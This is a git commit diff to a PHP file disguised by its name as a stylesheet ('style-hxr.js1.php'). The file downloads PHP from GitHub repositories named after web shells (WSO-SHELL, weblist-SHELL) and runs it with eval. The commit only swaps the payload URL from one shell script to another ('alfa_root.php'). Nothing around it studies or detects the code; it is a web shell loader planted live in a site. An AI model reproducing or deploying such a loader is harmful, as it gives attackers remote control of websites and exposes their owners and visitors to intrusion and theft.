2924057a6e20e544e3ada17eee43a996235be4dc
rendihidayat683 <rendihidayat683@gmail.com>
2025-10-29 01:30:36 +0700

    Update style-hxr.js1.php

--- style-hxr.js1.php
+++ style-hxr.js1.php
@@ -50,7 +50,7 @@ function is_logged_in()
         return $urls;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/wp-settingg.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/alfa_root.php');
     eval('?>' . $a);
 
 ?>
